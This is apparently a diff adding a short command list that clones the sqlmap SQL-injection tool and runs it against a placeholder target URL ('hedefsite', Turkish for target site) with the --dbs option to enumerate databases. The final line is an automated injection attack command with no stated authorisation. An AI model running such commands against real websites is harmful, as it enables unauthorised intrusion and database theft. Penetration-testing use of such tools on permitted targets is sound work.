@@ -1,0 +1,7 @@
+git clone https://github.com/sqlmapproject/sqlmap.git
+
+cd sqlmap
+
+python2 sqlmap.py
+
+python2 sqlmap.py "https://www.hedefsite.com/index.php?id=50" --dbs
